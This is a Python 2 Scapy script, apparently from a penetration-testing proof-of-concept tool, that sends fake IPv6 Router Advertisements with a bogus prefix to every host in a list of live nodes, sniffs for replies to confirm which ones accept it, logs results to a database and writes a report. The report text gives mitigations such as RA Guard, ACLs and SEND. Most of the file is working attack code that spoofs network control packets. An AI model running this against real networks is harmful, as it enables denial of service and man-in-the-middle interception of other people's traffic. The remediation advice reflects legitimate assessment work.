#! /usr/bin/env python

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import subprocess
import sys
import sqlite3
import datetime


db = sqlite3.connect('/root/PythonScripts/PoCDB.db')

IfaceMac = str(subprocess.check_output("cat /sys/class/net/eth1/address", shell=True)).splitlines()
wrongPrefix = "d00d::"

#Function to generate report name
def generateReportName():
    global date
    global ext
    now = datetime.datetime.now()
    date = now.strftime("%Y-%m-%d-%H-%M")
    rn = "/var/www/html/PoC/assets/reports/fakeRA"
    ext = ".txt"
    reportName = "".join((rn,date,ext))

    return(reportName)

#Prepare Permanent part of Report
def prepareReport():   
    with open(path, 'w') as f:
	 f.write("================ Fake Router Advertisement Attack: Report [ " + datetime.datetime.now().strftime('%Y-%m-%d %H:%M') + " ] =================\n\n")
         f.write("This attack was generated by crafting a customized RA packet containing a wrong prefix.\n\n")
         f.write("Impact: This can be used by an attacker to create a Dos or MITM attack.\n")
         f.write("The severity of such attacks is dependent on what fields within an RA packet are modified\n")
         f.write("and whether or not an attacker can introduce a fake router with external connectivity to the\n")
         f.write("network.\n\n")
         f.write("Problem: IPv6 nodes more often than not obtain their addresses through stateless address\n")
         f.write("autoconfiguration based on information contained in RA messages and because the neighbor\n")  
         f.write("discovery protocol inherently trusts nodes on the same link, no authentication mechanism is\n")
         f.write("present to determine legitimate nodes from non legitimate ones. Also, because this is a flaw\n")
         f.write("inherent to the functionality of NDP, preventive measures are centered around better network\n")
         f.write("configurations to make it harder for malicious actors to contaminate the network with these\n")
         f.write("messages in case they manage to gain access.\n\n\n")
         f.write("===== Possible Solutions =====\n\n")
         f.write("1. The most effective solution will be to completely turn off IPv6 connectivity on networks\n")
         f.write("that do not use or need it.\n\n")
         f.write("In case the option (1) is not feasible, here are some other things that can be done\n\n")
         f.write("2. Using RA Guard (NB: This can only be used in networks that possess an intermediary device\n")
         f.write("   such as Ethernet switch through which all traffic passes)\n\n")
         f.write(" - On Cisco Switches the following commands can be used: \n\n")
         f.write("   ipv6 nd raguard policy POLICY-NAME <- Defines RA Guard policy name\n")
         f.write("   device-role {host | router} <- Specifies the role of the device attached to the port\n\n")
    	 f.write("*** Other options include checking hop limit, router preference, etc. Please check out Cisco\n")
	 f.write("documentation for more information\n\n")
	 f.write("  After being configured the policy is applied to an interface as follows:\n")
      	 f.write("  ipv6 nd raguard attach-policy POLICY-NAME\n\n\n")
	 f.write("3. Use Access Control Lists to ONLY allow RA messages from the network's default routers\n\n")
	 f.write("4. Implement SEcure Neighbor Discovery (Se-ND) that focuses on mitigating flaws associated\n")
	 f.write("   with NDP in general by making use of Certification Paths and Cryptographically Generated\n")
	 f.write("   Addresses thereby providing a way for nodes and routers to authenticate each other.\n\n\n")
	 f.write("Below is a list of IPv6 addresses of nodes within this network vulnerable to this attack:\n\n")


#Function to create the expected fake IPv6 addresses
def splitAddress(line):
    first, suffix = line.split("::")
    fakeip = wrongPrefix + suffix

    return(fakeip)	


#Function to craft the RA packet with a wrong prefix and other customized parameters
def fakeRAPacket(ip6,imac,wprefix):
    a = IPv6()
    a.dst = ip6

    b = ICMPv6ND_RA()
    b.routerlifetime = 0     #Make sure no default route is installed in targets

    c = ICMPv6NDOptSrcLLAddr()
    c.lladdr = imac		#MAC address of the interface directly connected to the network

    d = ICMPv6NDOptMTU()

    e = ICMPv6NDOptPrefixInfo()
    e.prefixlen = 64
    e.prefix = wprefix
    e.validlifetime = 900       #Prefix is only valid for 15 mins
    e.preferredlifetime = 900   #Address generated from prefix is only preferred for 15 mins

    fakeRApkt = a/b/c/d/e

    return fakeRApkt


#Function to filter the sniffed packets and determine whether or not the attack was successful
def RAFilter(pkt):
    global count
    print fakeIP
    if IPv6 in pkt:
       if ICMPv6ND_NS in pkt:
          pktip6 = pkt[ICMPv6ND_NS]
          if pktip6.tgt == fakeIP:
             count = 1
             return True
    
    return False


global date
global ext
date = " "
ext = " "	

attack = "fakeRA"
currentDate = datetime.datetime.now().strftime('%Y-%m-%d %H:%M')
global path
path = generateReportName()

realPath = "/PoC/assets/reports/fakeRA"
downloadPath = "".join((realPath,date,ext))

with open('/root/UsefulOutput/liveNodes.txt','r') as f:
    	IP6_Array = f.read().splitlines()
	
prepareReport()

for line in IP6_Array:
     IP6Addr = line
     global fakeIP 
     fakeIP = str(splitAddress(line))
     print IP6Addr
     
     fakeRApkt = fakeRAPacket(IP6Addr,IfaceMac,wrongPrefix)

     global count
     count = 0     

     send(fakeRApkt)     
     sniffedPacket = sniff(lfilter=RAFilter,iface="eth1",count=1, timeout=7)
     sniffedPacket.show()
     sniffedPacket = None   #reinitialize the variable so it can hold values for the next IPv6 address  
 	
     
     print "count = "
     print count

     if count == 0:
        print "Attack Failed"

	cursor = db.cursor()
	cursor.execute('''UPDATE IPv6_Hosts SET fakeRAStatus = 2 WHERE ipv6_address=?''', (IP6Addr,))
        db.commit()
     else:
        count = 0
        print "Attack Successful"

 	cursor = db.cursor()
	cursor.execute('''UPDATE IPv6_Hosts SET fakeRAStatus = 1 WHERE ipv6_address=?''', (IP6Addr,))
	db.commit()


        with open(path, 'a') as f:
            f.write(IP6Addr + "\n")

	
cursor.execute('''INSERT INTO Reports(attack,report_path,date) VALUES(?,?,?)''',(attack,downloadPath,currentDate))
db.commit()
print "done"      

db.close()    




